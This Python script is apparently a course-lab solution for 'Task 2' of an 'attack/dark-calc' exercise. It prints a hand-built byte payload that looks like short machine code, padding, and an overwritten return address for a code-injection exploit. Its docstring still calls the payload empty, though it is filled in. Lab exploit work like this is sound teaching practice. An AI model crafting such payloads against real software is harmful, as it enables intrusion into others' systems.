#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"\x31\xFF\xB2\x04\xE9\xAE\xE9\xDF\xFFABCDEFGHIJKLMNO\xd0\x30\x60\x00\x00\x00\x00"

sys.stdout.buffer.write(payload)
